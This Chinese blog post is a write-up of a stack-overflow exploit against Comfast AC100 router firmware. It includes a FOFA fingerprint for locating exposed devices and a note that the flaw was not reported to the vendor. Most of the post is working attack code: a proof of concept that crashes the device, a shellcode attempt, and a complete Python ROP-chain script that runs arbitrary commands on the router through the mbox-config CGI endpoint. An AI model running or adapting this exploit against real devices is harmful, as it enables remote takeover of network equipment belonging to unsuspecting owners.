---
title: Comfast 系列产品 /栈溢出ROP利用链构造 - Updated
published: true
---

Comfast 本身是个比较小众品牌，出的洞危害范围较小，其安全防御措施也较为轻松.  

关于本篇文章分析的利用链，没什么交漏洞库和提醒厂商的必要，没什么好说的. 不过看到网上关于他的漏洞，都没有写明合适构造链. 因此在此浅浅分析一下 ROP 利用链就行了. 该产品采用 mipsel 32 指令集

本文章不遵循 CC 协议，除开特别说明标注，该文章未经许可禁止转载

fofa语法:  
```
icon_hash="-1026040476"
```

| 目录跳转 |
|--------|
| [直接写 shellcode (失败)](#直接写shellcode) |
| [ROP 链构造调用 system (成功)](#rop链构造1) |
| [ROP 链构造直接调用 syscall (更新中)](#rop链构造2) |

# [](#header-3)直接写shellcode

一个尚未公开的栈溢出PoC(前提是登录，客户端 IP 被服务端记录在案):
```py
def Vul4_AC100(host: str) -> None:
	'''
	Stack OverFlow & DDoS
	Requirement: Authorized
    by leeya_bug
	'''
	import requests
    data0 = 'A' * 500
	data = '{"portal_delete_picname":"' + data0 + '"}'
	requests.post("http://" + host + "/cgi-bin/mbox-config?method=SET&section=wifilith_delete_pic_file", data = data)

Vul4_AC100(HOST的地址)
```

笔者在此已经下载到了该厂商的一个通用网关固件，将其模拟起来并成功复现了该漏洞. 由于该厂商大多数产品都是通用固件的模板复用，因此只要有洞那大概率其他固件也能复现   
下载链接如下所示，提取文件系统可以发现就是 nginx + web cgi

[https://dl.comfast.cn/firmware/CF-AC100-V2.6.0.8.zip](https://dl.comfast.cn/firmware/CF-AC100-V2.6.0.8.zip)

此时已知：  
栈上字符串变量的首地址为 0x2B2A6540  

1. 首先，在栈上预写满 0xff 个指令 `addiu $a0, $zero, 0x457`，并更改栈返回地址将程序跳转至 0x2B2A6654，具体跳到哪里无所谓，只要跳到 `addiu $a0, $zero, 0x457` * 0xff 这个区间里面的任意地址就行. 
2. 准备完毕后，构造命令的执行 Payload，并将构建完毕的 Payload 接入填充指令的尾部，进而后续执行(0x2B4002F0 是 system 函数的地址，此处未开启栈随机化，因此暂时拿 0x2B4002F0 作为其地址)  
	```mips
	li 	$a0, 0x2B2A7A58
	li 	$t9, 0x2B4002F0
	jalr $t9
	```
3. 写入要执行的命令，例如 `mkdir /12345`，在此处是不得手动添加 `\x00` 在末尾的

测试版本的 Shellcode 如下所示

```python
data0  = b'A' * 248
data0 += p32(0x2B2A7660)
data0 += b'A' * 0xff0
data0 += b"\x57\x04\x04\x24" * 0xff			#写入 addiu $a0, $zero, 0x457
data0 += b"\x2a\x2b\x04\x3c\x58\x7a\x84\x34\x40\x2b\x19\x3c\xf0\x02\x39\x37\x09\xf8\x20\x03"
data0 += b"mkdir /12345"
```

可以发现PC成功跳转，但是继续运行就报错！这是为什么？后续经 checksec 才发现，Comfast 最新版本的固件居然开启了 NX 保护，因此现在无法在栈上执行任何代码了(明明之前还没开的)

(`li $a0, 0x457` 即为 `addiu $a0, $zero, 0x457`)

![/image/cfac100/2.png](/image/cfac100/2.png)  

![/image/cfac100/3.png](/image/cfac100/3.png)  

不过这倒无所谓，换种方法继续构造罢了  

# [](#header-3)rop链构造1

对于该固件，ROP 链的构造有一点需要注意：由于向该固件输入的字符串首先必须经过各种 json 库处理，因此我们输入的字符串的任何地方 都不能包含字节 `\x00` 于其中. 否则就会截断整个 json，导致输入不成功.  

在这种情况下，由于程序静态加载的函数的地址 总是自 0x00... 开头，向这类地址跳转需要另找几个 gadget. 因此笔者只好优先跳到高地址动态链接的函数，并且该函数的 gadget 地址也不能包含 `\x00`

`一个例子 sub_419BC0 如下所示，由于直接跳转到该函数需要在栈中写入 \x00，因此很难跳到该函数中`  
![/image/cfac100/3.png](/image/cfac100/13.png)  

很巧的是，libuClibc-0.9.33.2.so 中的 system 函数加载到地址 0x2B4002F0，如果该地址凑巧包含 `\x00` 于其中，那又要多找几个 gadget 来匹配他了.  
那么此时笔者的目标是 合理地 跳到位于 0x2B4002F0 的 system 函数中(如下图所示，此处未开启栈随机化，因此暂时拿 0x2B4002F0 作为其地址). 

![/image/cfac100/3.png](/image/cfac100/4.png)  

该固件直接加载 ld-uClibc-0.9.33.2.so、libuClibc-0.9.33.2.so，因此直接分析这两个中的 ROP gadget 即可. 

在这里一共需要三条 gadget：  
1. 一条 gadget 用来控制 $s0 ~ $s7 寄存器
2. 一条 gadget 用来向可写入空间 0x0046C000 ~ 0x00483D60 写入 payload，由于无法直接写入 `\x00`，该 gadget 必须分为两部分处理：
   
   2.1. 写入包含 `\x00` 的地址  

   2.2. 将数据存入到该地址中  

3. 一条 gadget 修改 a0、s0 寄存器的值并调用 system 函数

前期可以在 ld-uClibc-0.9.33.2.so、libuClibc-0.9.33.2.so 中使用 mips gadget 找寻工具利用 mipsrop.find 一下. 

`mipsrop.find('jr $ra')` 

![/image/cfac100/3.png](/image/cfac100/11.png)  

在这里，笔者首先在 ld-uClibc-0.9.33.2.so 中找了一段只能控制到 jalr $t9 的 gadget (如下所示)  

在找了几段类似的 gadget 测试后，发现在此也需要修改 $a0 寄存器的值. 于是后面直接在 libuClibc-0.9.33.2.so 中的 system 函数正巧里找了段 既能够控制 $a0 又能控制 $t9 的 gadget. 另找的 gadget 在下面 (2.) 展示

![/image/cfac100/3.png](/image/cfac100/7.png)  

1. 第一条 gadget 在 ld-uClibc-0.9.33.2.so 中的地址为 0x4E04，能控制 $s0 - $s7 寄存器，是比较理想的在此用来控制寄存器的 gadget.  
   
	![/image/cfac100/3.png](/image/cfac100/12.png)  

	`以下是该函数原始 gadget，明显不够用`

	![/image/cfac100/3.png](/image/cfac100/6.png)  

	而后计算 ld-uClibc-0.9.33.2.so 中 __uClibc_main 至 0x4E04 的偏移量并和加载后的 lib 作计算： `0x2B2B2550 + 0x68 - (0x65B8 - 0x4E04) == 0x2B2B0E04`，再将 PC 跳转到该地址

2. 第二条 gadget 在 libuClibc-0.9.33.2.so 中，通过整型溢出的方式可以让 $s2 寄存器的值可控在 0x0046C000 ~ 0x00483D60 这个区间，并再将 $s1 寄存器的四字节值写入到 $s2 寄存器值所指的区间的地址中. 具体怎么溢出？addu 指令执行的逻辑是：
   
   `addu rd，rs，rt:   rd ← rs + rt`

   当发生整型溢出时，将不会报错，直接从 0 开始溢出. 因此如果想要将 $s2 寄存器的值改变为 0x0047C010，当发生如下计算时，两个寄存器的值均不会包含 `\x00` 字节且他们相加起来的值为 0x0047C010 

   ```
   s3 = 0x7f0f0f10 + 0x0047C010
   s2 = 0x80f0f0f0
   s2 + s3 = 0x0047c010
   ```

   因此可以通过这个原理，直接往内存中可写的地址写入需要的字节
   
	![/image/cfac100/3.png](/image/cfac100/14.png) 

3. 第三条 gadget 位于 libuClibc-0.9.33.2.so 中的 system 函数附近，该 gadget 地址为 0x2B3FFFF4，首先该 gadget 从栈上获取值并赋值给 $a0，而后旋即将 $s7 赋值给 $t9，再 jalr $t9.
   
   ![/image/cfac100/3.png](/image/cfac100/10.png)     

接下来写代码：首先根据偏移量，分别计算两条 gadget 的位置，以及计算 system 原函数地址

```py
#by leeya_bug

if True:
	system_addr			= 0x2B4002F0
	uClibc_main_addr	= 0x2B2B2550
	string_addr			= 0x0047C010

	gadget_jalr_addr	= system_addr - 0x2fc
	# 0x2B2B2550 		是 __uClibc_main 的起始地址
	# 0x68				是 __uClibc_main 起始至 __uClibc_main 末尾指令 jr $t9 的距离
	# 0x65B8 - 0x4E04	是 __uClibc_main 中指令 jr $t9 至 gadget 起始距离
	gadget_addr 		= uClibc_main_addr + 0x68 - (0x65B8 - 0x4E04)
	gadget_write_addr	= system_addr - (0x000502F0 - 0x00028810)
```

首先利用 gadget1、2，构造一个向地址 string_addr + offset 写入长度为四字节的 string 的函数 (可以多次调用该函数分步写入)

```py
#by leeya_bug

def write_string_at(string, offset, jump_to=gadget_addr):
	if True:
		# gadget 1, 2
		data0 = b''
		data0 += b'A' * 0x1c								# stack padding, register padding
		data0 += string.encode()							# s1 
		data0 += p32(0x80f0f0f0) 							# s2 
		data0 += p32(0x7f0f0f0f + 1 + string_addr + offset) # s3 
		data0 += b'A' * 16									# register padding
		data0 += p32(jump_to)								# fp, return addr of gadget 2 
		data0 += p32(gadget_write_addr) 					# ra, return addr of gadget 1
		return data0
```

而后，利用 gadget1、3，构造一个使 $a0 赋值为 string_addr 并最终触发 system 函数的 gadget

构造完毕后，尝试运行 `echo leeya_bug-hacked!` 这条 linux 命令看看是否成功  
最后 Payload:

```py
import requests
from pwn import *

def Vul4_AC100(host: str) -> None:
	'''
	RCE
	Requirement: Authorized
    by leeya_bug
	'''
	import requests

	system_addr			= 0x2B4002F0
	uClibc_main_addr	= 0x2B2B2550
	string_addr			= 0x0047C010

	gadget_jalr_addr	= system_addr - 0x2fc
	# 0x2B2B2550 		是 __uClibc_main 的起始地址
	# 0x68				是 __uClibc_main 起始至 __uClibc_main 末尾指令 jr $t9 的距离
	# 0x65B8 - 0x4E04	是 __uClibc_main 中指令 jr $t9 至 gadget 起始距离
	gadget_addr 		= uClibc_main_addr + 0x68 - (0x65B8 - 0x4E04)
	gadget_write_addr	= system_addr - (0x000502F0 - 0x00028810)
	

	def write_string_at(string, offset, jump_to=gadget_addr):
		# gadget 1, 2
		data0 = b''
		data0 += b'A' * 0x1c								# stack padding, register padding
		data0 += string.encode()							# s1 
		data0 += p32(0x80f0f0f0) 							# s2 
		data0 += p32(0x7f0f0f0f + 1 + string_addr + offset) # s3 
		data0 += b'A' * 16									# register padding
		data0 += p32(jump_to)								# fp, return addr of gadget 2 
		data0 += p32(gadget_write_addr) 					# ra, return addr of gadget 1
		return data0

	data0 = b''
	data0 += b'A' * 248									# stack padding, register padding
	data0 += p32(gadget_addr)							# return

	data0 += write_string_at('echo', 0)
	data0 += write_string_at(' lee', 4)
	data0 += write_string_at('ya_b', 8)
	data0 += write_string_at('ug-h', 12)
	data0 += write_string_at('acke', 16)
	data0 += write_string_at('d!  ', 20, jump_to=gadget_addr)

	# gadget 1
	data0 += b'A' * 24									# stack padding 
	data0 += b'\x01' * 4 								# s0 
	data0 += b'\x01' * 4								# s1 
	data0 += b'\x02' * 4 								# s2 
	data0 += b'\x03' * 4 								# s3 
	data0 += b'\x04' * 4 								# s4 
	data0 += b'\x05' * 4						 		# s5 
	data0 += b'\x06' * 4 								# s6 
	data0 += (system_addr).to_bytes(4, 'little') 		# s7 
	data0 += b'\x08' * 4 								# fa 
	data0 += (gadget_jalr_addr).to_bytes(4, 'little') 	# return 

	data0 += b'A' * 0x64								# stack padding

	#gadget 3
	data0 += (0x47C010).to_bytes(3, 'little')			# return
	
	data = b'{"portal_delete_picname":"' + data0 + b'"}'
	#data = b'{"portal_delete_picname":"1"}'
	print(requests.post("http://" + host + "/cgi-bin/mbox-config?method=SET&section=wifilith_delete_pic_file", data = data).text)

Vul4_AC100("192.168.20.101")

```

一运行，果然固件提示 `leeya_bug-hacked!`，成功运行 `echo leeya_bug-hacked!`

证明利用链构造成功

![/image/cfac100/3.png](/image/cfac100/15.png) 

本文章不遵循 CC 协议，除开特别说明标注，该文章未经许可禁止转载

# [](#header-3)rop链构造2

未更新